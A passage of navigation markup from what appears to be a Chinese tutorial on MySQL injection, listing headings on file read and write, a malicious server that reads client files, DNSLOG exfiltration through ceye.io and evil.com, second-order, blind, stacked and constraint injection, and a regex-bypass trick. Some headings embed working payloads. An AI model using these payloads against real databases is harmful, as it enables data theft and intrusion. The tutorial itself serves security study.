class="nav-number">2.3.12.2.</span> <span class="nav-text">摘自——Mysql 注入基础小结</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x07-文件读-写"><span class="nav-number">2.4.</span> <span class="nav-text">0x07.文件读/写</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们知道Mysql是很灵活的，它支持文件读-写功能。在讲这之前，有必要介绍下什么是file-priv和secure-file-priv。"><span class="nav-number">2.4.0.1.</span> <span class="nav-text">我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是file_priv和secure-file-priv。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#file-pric是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下面的payload查看权限。"><span class="nav-number">2.4.0.2.</span> <span class="nav-text">file_pric是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下面的payload查看权限。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-7"><span class="nav-number">2.4.0.3.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#secure-file-priv是一个系统变量，对于文件读-写功能进行限制。具体如下："><span class="nav-number">2.4.0.4.</span> <span class="nav-text">secure-file-priv是一个系统变量，对于文件读/写功能进行限制。具体如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注：5-5-53本身及之后的版本默认值为NULL，之前的版本无内容。"><span class="nav-number">2.4.0.5.</span> <span class="nav-text">注：5.5.53本身及之后的版本默认值为NULL，之前的版本无内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#三种方法查看当前secure-file-priv的值："><span class="nav-number">2.4.0.6.</span> <span class="nav-text">三种方法查看当前secure-file-priv的值：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-8"><span class="nav-number">2.4.0.7.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#修改："><span class="nav-number">2.4.0.8.</span> <span class="nav-text">修改：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在my-ini中设置读写权限。"><span class="nav-number">2.4.0.9.</span> <span class="nav-text">在my.ini中设置读写权限。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#读"><span class="nav-number">2.4.1.</span> <span class="nav-text">读</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Mysql读取文件通常使用load-file函数，语法如下："><span class="nav-number">2.4.1.1.</span> <span class="nav-text">Mysql读取文件通常使用load_file函数，语法如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-9"><span class="nav-number">2.4.1.2.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注：在输入文件的绝对路径的时候，要用-来替换-，由于在mysql种-会被当做转换符来处理。"><span class="nav-number">2.4.1.3.</span> <span class="nav-text">注：在输入文件的绝对路径的时候，要用/来替换\，由于在mysql种\会被当做转换符来处理。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#读第二种读取文件的方法："><span class="nav-number">2.4.1.4.</span> <span class="nav-text">读第二种读取文件的方法：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-10"><span class="nav-number">2.4.1.5.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接"><span class="nav-number">2.4.1.6.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-blog-csdn-net-u014082714-article-details-53173975"><span class="nav-number">2.4.1.7.</span> <span class="nav-text">https://blog.csdn.net/u014082714/article/details/53173975</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#第三种读取文件的方法："><span class="nav-number">2.4.1.8.</span> <span class="nav-text">第三种读取文件的方法：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-11"><span class="nav-number">2.4.1.9.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#限制："><span class="nav-number">2.4.1.10.</span> <span class="nav-text">限制：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#低权限读取文件"><span class="nav-number">2.4.2.</span> <span class="nav-text">低权限读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#5-5-53secure-file-priv-NULL读文件payload，mysql8测试失败-需要开启读写的权限-，其他版本自测。"><span class="nav-number">2.4.2.1.</span> <span class="nav-text">5.5.53secure-file-priv=NULL读文件payload，mysql8测试失败(需要开启读写的权限)，其他版本自测。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Mysql连接数据库时可读取文件"><span class="nav-number">2.4.3.</span> <span class="nav-text">Mysql连接数据库时可读取文件</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。"><span class="nav-number">2.4.3.1.</span> <span class="nav-text">这个漏洞是mysql的一个特性产生的，是上述的第三种读文件的方法为基础的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简单描述该漏洞：Mysql客户端在执行load-data-local语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下："><span class="nav-number">2.4.3.2.</span> <span class="nav-text">简单描述该漏洞：Mysql客户端在执行load data local语句的时，先想mysql服务端发送请求，服务端接收到请求，并返回需要读取的文件地址，客户端接收该地址并进行读取，接着将读取到的内容发送给服务端。用通俗的语言可以描述如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#原本的查询流程为"><span class="nav-number">2.4.3.3.</span> <span class="nav-text">原本的查询流程为</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例子部分修改自：CSS-T-Mysql-Client-任意文件读取攻击链拓展"><span class="nav-number">2.4.3.4.</span> <span class="nav-text">例子部分修改自：CSS-T | Mysql Client 任意文件读取攻击链拓展</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#换句话说：load-data-local语句要读取的文件会受到服务端的控制。"><span class="nav-number">2.4.3.5.</span> <span class="nav-text">换句话说：load data local语句要读取的文件会受到服务端的控制。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其次，在Mysql官方文档对于load-data-local语句的安全说明中有这么一句话"><span class="nav-number">2.4.3.6.</span> <span class="nav-text">其次，在Mysql官方文档对于load data local语句的安全说明中有这么一句话:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#A-patched-server-could-in-fact-reply-with-a-file-transfer-request-to-any-statement-not-justLOAD-DATA-LOCAL-so-a-more-fundamental-issue-is-that-clients-should-not-connect-to-untrusted-servers"><span class="nav-number">2.4.3.7.</span> <span class="nav-text">A patched server could in fact reply with a file-transfer request to any statement, not justLOAD DATA LOCAL, so a more fundamental issue is that clients should not connect to untrusted servers.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load-data-local语句。"><span class="nav-number">2.4.3.8.</span> <span class="nav-text">意思是：服务器对客户端的文件读取请求实际上是可以返回给客户端发送给服务端的任意语句请求的，不仅仅只是load data local语句。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这就会产生什么结果呢？之前讲的例子，将可以变成："><span class="nav-number">2.4.3.9.</span> <span class="nav-text">这就会产生什么结果呢？之前讲的例子，将可以变成：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到，客户端相当于被攻击者给半劫持了。"><span class="nav-number">2.4.3.10.</span> <span class="nav-text">可以看到，客户端相当于被攻击者给半劫持了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。"><span class="nav-number">2.4.3.11.</span> <span class="nav-text">利用上述的特性，我们通过构造一个恶意的服务端，即可完成上述的过程。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简易恶意服务端代码："><span class="nav-number">2.4.3.12.</span> <span class="nav-text">简易恶意服务端代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#需要注意的是：这个过程需要客户端允许使用load-data-local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。"><span class="nav-number">2.4.3.13.</span> <span class="nav-text">需要注意的是：这个过程需要客户端允许使用load data local才行，不过这个信息在客户端尝试连接到服务端的数据包中可以找到。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#写"><span class="nav-number">2.4.4.</span> <span class="nav-text">写</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下："><span class="nav-number">2.4.4.1.</span> <span class="nav-text">说完了读文件，那我们来说说mysql的写文件操作。常见的写文件操作如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-12"><span class="nav-number">2.4.4.2.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#限制：-1"><span class="nav-number">2.4.4.3.</span> <span class="nav-text">限制：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#日志法"><span class="nav-number">2.4.5.</span> <span class="nav-text">日志法</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#由于mysql在5-5-53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。"><span class="nav-number">2.4.5.1.</span> <span class="nav-text">由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mysql日志文件的一些相关设置可以直接通过命令来进行："><span class="nav-number">2.4.5.2.</span> <span class="nav-text">mysql日志文件的一些相关设置可以直接通过命令来进行：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#之后我们在让数据库执行满足记录条件的恶意语句即可。"><span class="nav-number">2.4.5.3.</span> <span class="nav-text">之后我们在让数据库执行满足记录条件的恶意语句即可。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#限制：-2"><span class="nav-number">2.4.5.4.</span> <span class="nav-text">限制：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-DNSLOG带出数据"><span class="nav-number">2.5.</span> <span class="nav-text">0x08.DNSLOG带出数据</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问-请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。"><span class="nav-number">2.5.0.1.</span> <span class="nav-text">什么是DNSLOG？简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB注入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc-evil-com，通过记录evil-com的DNS记录，就可以得到数据：aabbcc。"><span class="nav-number">2.5.0.2.</span> <span class="nav-text">如何用DNSLOG带出数据？若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#引自：Dnslog在SQL注入中的实战"><span class="nav-number">2.5.0.3.</span> <span class="nav-text">引自：Dnslog在SQL注入中的实战</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload-load-file-concat-39-39-select-user-39-xxxx-ceye-io-xxxx-39-。"><span class="nav-number">2.5.0.4.</span> <span class="nav-text">payload:load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.xxxx.ceye.io\xxxx&#39;))。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#应用场景："><span class="nav-number">2.5.0.5.</span> <span class="nav-text">应用场景：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#推荐平台：ceye-io"><span class="nav-number">2.5.0.6.</span> <span class="nav-text">推荐平台：ceye.io</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以-开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个-中的两个-是用来进行转义处理的。"><span class="nav-number">2.5.0.7.</span> <span class="nav-text">为什么Windows可用，Linux不行？这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。注：payload里的四个\\\\中的两个\是用来进行转义处理的。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x09-二次注入"><span class="nav-number">2.6.</span> <span class="nav-text">0x09.二次注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。"><span class="nav-number">2.6.0.1.</span> <span class="nav-text">什么是二次注入？简单的说，就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#举个例子，某个查询当先登录的用户信息的SQL语句如下："><span class="nav-number">2.6.0.2.</span> <span class="nav-text">举个例子，某个查询当先登录的用户信息的SQL语句如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#登录-注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。"><span class="nav-number">2.6.0.3.</span> <span class="nav-text">登录/注册处的SQL语句都经过了addslashes函数、单引号闭合的处理，且无编码产生的问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于上述举的语句我们可以先注册一个名为admin-39-的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。"><span class="nav-number">2.6.0.4.</span> <span class="nav-text">对于上述举的语句我们可以先注册一个名为admin&#39; #的用户名，因为在注册进行了单引号的转义，故我们并不能直接进行insert注入，最终将我们的用户名存储在了服务器中，注意：反斜杠转义掉了单引号，在mysql中得到的数据并没有反斜杠的存在。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在我们进行登录操作的时候，我们用注册的admin-39-登录系统，并将用户部分数据存储在对于的SESSION中，如-SESSION-39-username-39-。"><span class="nav-number">2.6.0.5.</span> <span class="nav-text">在我们进行登录操作的时候，我们用注册的admin&#39; #登录系统，并将用户部分数据存储在对于的SESSION中，如$_SESSION[&#39;username&#39;]。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上述的-SESSION-39-username-39-并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为："><span class="nav-number">2.6.0.6.</span> <span class="nav-text">上述的$_SESSION[&#39;username&#39;]并没有经过处理，直接拼接到了SQL语句之中，就会造成SQL注入，最终的语句为：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x10-order-by比较盲注"><span class="nav-number">2.7.</span> <span class="nav-text">0x10.order by比较盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这种方法运用的情况比较极端一些，如布尔盲注时，字符截取-比较限制很严格。例子："><span class="nav-number">2.7.0.1.</span> <span class="nav-text">这种方法运用的情况比较极端一些，如布尔盲注时，字符截取/比较限制很严格。例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实际上此处是利用了order-by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。"><span class="nav-number">2.7.0.2.</span> <span class="nav-text">实际上此处是利用了order by语句的排序功能来进行判断的。若我们想要查询的数据开头的首字母在字母表的位值比我们判断的值要靠后，则limit语句将不会让其输出，那么整个条件将会成立，否之不成立。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。"><span class="nav-number">2.7.0.3.</span> <span class="nav-text">利用这种方法可以做到不需要使用like、rlike、regexp等匹配语句以及字符操作函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#再举个例子："><span class="nav-number">2.7.0.4.</span> <span class="nav-text">再举个例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？"><span class="nav-number">2.7.0.5.</span> <span class="nav-text">页面回显的字段为：username与password，如何在union与flag两单词被拦截、无报错信息返回的情况下获取到用户名为admin的flag值？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join-using-报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？"><span class="nav-number">2.7.0.6.</span> <span class="nav-text">我们前边讲到了无列名注入，通过使用union语句来对未知列名进行重命名的形式绕过，还讲过通过使用join using()报错注入出列名。但现在，这两种方法都不可以的情况下该如何获取到flag字段的内容？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用order-by可轻松盲注出答案。payload："><span class="nav-number">2.7.0.7.</span> <span class="nav-text">使用order by可轻松盲注出答案。payload：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。"><span class="nav-number">2.7.0.8.</span> <span class="nav-text">与之前的原理相同，通过判断前后两个select语句返回的数据前后顺序来进行盲注。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x11-常见函数-符号归类"><span class="nav-number">2.8.</span> <span class="nav-text">0x11.常见函数/符号归类</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#注释符"><span class="nav-number">2.8.1.</span> <span class="nav-text">注释符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常用运算符"><span class="nav-number">2.8.2.</span> <span class="nav-text">常用运算符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#系统信息函数"><span class="nav-number">2.8.3.</span> <span class="nav-text">系统信息函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#进制转换"><span class="nav-number">2.8.4.</span> <span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#字符截取-拼接"><span class="nav-number">2.8.5.</span> <span class="nav-text">字符截取/拼接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常见全局变量"><span class="nav-number">2.8.6.</span> <span class="nav-text">常见全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#PS：查看全部全局变量SHOW-GLOBAL-VARIABLES-。"><span class="nav-number">2.8.6.1.</span> <span class="nav-text">PS：查看全部全局变量SHOW GLOBAL VARIABLES;。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#其他常用函数-语句"><span class="nav-number">2.8.7.</span> <span class="nav-text">其他常用函数/语句</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x12-约束攻击"><span class="nav-number">2.9.</span> <span class="nav-text">0x12.约束攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#什么是约束攻击？"><span class="nav-number">2.9.0.1.</span> <span class="nav-text">什么是约束攻击？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#仍然是先举个例子："><span class="nav-number">2.9.0.2.</span> <span class="nav-text">仍然是先举个例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们先通过下列语句建立一个用户表"><span class="nav-number">2.9.0.3.</span> <span class="nav-text">我们先通过下列语句建立一个用户表</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注册代码："><span class="nav-number">2.9.0.4.</span> <span class="nav-text">注册代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#登录判断代码："><span class="nav-number">2.9.0.5.</span> <span class="nav-text">登录判断代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？"><span class="nav-number">2.9.0.6.</span> <span class="nav-text">在无编码问题，且进行了单引号的处理情况下仍可能发生什么SQL注入问题呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。"><span class="nav-number">2.9.0.7.</span> <span class="nav-text">我们注意到，前边创建表格的语句限制了username和password的长度最大为25，若我们插入数据超过25，MYSQL会怎样处理呢？答案是MYSQL会截取前边的25个字符进行插入。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。"><span class="nav-number">2.9.0.8.</span> <span class="nav-text">而对于SELECT查询请求，若查询的数据超过25长度，也不会进行截取操作，这就产生了一个问题。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username-admin-25个空格-x-amp-password-123456的账号，服务器会先查询admin-25个空格-x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username-admin-20个空格-amp-password-123456。"><span class="nav-number">2.9.0.9.</span> <span class="nav-text">通常对于注册处的代码来说，需要先判断注册的用户名是否存在，再进行插入数据操作。如我们注册一个username=admin[25个空格]x&amp;password=123456的账号，服务器会先查询admin[25个空格]x的用户是否存在，若存在，则不能注册。若不存在，则进行插入数据的操作。而此处我们限制了username与password字段长度最大为25，所以我们实际插入的数据为username=admin[20个空格]&amp;password=123456。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接着进行登录的时，我们使用：username-admin-amp-password-123456进行登录，即可成功登录admin的账号。"><span class="nav-number">2.9.0.10.</span> <span class="nav-text">接着进行登录的时，我们使用：username=admin&amp;password=123456进行登录，即可成功登录admin的账号。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-13"><span class="nav-number">2.9.0.11.</span> <span class="nav-text">例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#防御："><span class="nav-number">2.9.0.12.</span> <span class="nav-text">防御：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x13-堆叠注入"><span class="nav-number">2.10.</span> <span class="nav-text">0x13.堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#简单的说，由于分号-为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。"><span class="nav-number">2.10.0.1.</span> <span class="nav-text">简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入，-可考虑使用RENAME关键字，将想要的数据列名-表名更改成返回数据的SQL语句所定义的表-列名-。具体参考：2019强网杯——随便注Writeup"><span class="nav-number">2.10.0.2.</span> <span class="nav-text">注意，通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。建议使用union联合注入，若无法使用联合注入， 可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。具体参考：2019强网杯——随便注Writeup</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP中堆叠注入的支持情况："><span class="nav-number">2.10.0.3.</span> <span class="nav-text">PHP中堆叠注入的支持情况：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#引自：PDO场景下的SQL注入探究"><span class="nav-number">2.10.0.4.</span> <span class="nav-text">引自：PDO场景下的SQL注入探究</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x14-handler语句代替select查询"><span class="nav-number">2.11.</span> <span class="nav-text">0x14.handler语句代替select查询</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。"><span class="nav-number">2.11.0.1.</span> <span class="nav-text">mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#语法结构："><span class="nav-number">2.11.0.2.</span> <span class="nav-text">语法结构：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如：通过handler语句查询users表的内容"><span class="nav-number">2.11.0.3.</span> <span class="nav-text">如：通过handler语句查询users表的内容</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x15-一些小Trick"><span class="nav-number">2.12.</span> <span class="nav-text">0x15.一些小Trick</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。"><span class="nav-number">2.12.0.1.</span> <span class="nav-text">这里跟大家分享一些有意思的Trick，主要在一些CTF题出现，这里也把它记下来，方便复习。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP-union-select-ig绕过。"><span class="nav-number">2.12.0.2.</span> <span class="nav-text">PHP/union.+?select/ig绕过。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。"><span class="nav-number">2.12.0.3.</span> <span class="nav-text">在某些题目中，题目禁止union与select同时出现时，会用此正则来判断输入数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre-backtrack-limit。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数-默认为-100万-，那么正则停止，返回未匹配到数据。"><span class="nav-number">2.12.0.4.</span> <span class="nav-text">PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。若我们输入的数据使得PHP进行回溯且此数超过了规定的回溯上限此数(默认为 100万)，那么正则停止，返回未匹配到数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#故而我们构造payload：union-100万个a，充当垃圾数据-select即可绕过正则判断。"><span class="nav-number">2.12.0.5.</span> <span class="nav-text">故而我们构造payload：union/*100万个a，充当垃圾数据*/select即可绕过正则判断。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#一道相关的CTF题：TetCTF-2020-WP-BY-MrR3boot"><span class="nav-number">2.12.0.6.</span> <span class="nav-text">一道相关的CTF题：TetCTF-2020 WP BY MrR3boot</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x16-无列名盲注"><span class="nav-number">2.13.</span> <span class="nav-text">0x16.无列名盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#前边提到了，在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order-by盲注之外，这里再提一种新的方法，直接通过select进行盲注。"><span class="nav-number">2.13.0.1.</span> <span class="nav-text">前边提到了，在知道表名，不知道列名的情况下，我们可以利用union来给未知列名“重命名”，还可以利用报错函数来注入出列名。现在，除了之前的order by盲注之外，这里再提一种新的方法，直接通过select进行盲注。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#核心payload：-select-39-admin-39-39-admin-39-gt-select-from-users-limit-1"><span class="nav-number">2.13.0.2.</span> <span class="nav-text">核心payload：(select &#39;admin&#39;,&#39;admin&#39;)&gt;(select * from users limit 1)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#子查询之间也可以直接通过-gt-、-lt-、-来进行判断。"><span class="nav-number">2.13.0.3.</span> <span class="nav-text">子查询之间也可以直接通过&gt;、&lt;、=来进行判断。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如：-14"><span class="nav-number">2.13.0.4.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x17-UPDATE注入重复字段赋值"><span class="nav-number">2.14.</span> <span class="nav-text">0x17.UPDATE注入重复字段赋值</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#即：UPDATA-table-name-set-field1-new-value-field1-new-value2-where-，最终field1字段的内容为new-value2，可用这个特性来进行UPDATA注入。如："><span class="nav-number">2.14.0.1.</span> <span class="nav-text">即：UPDATA table_name set 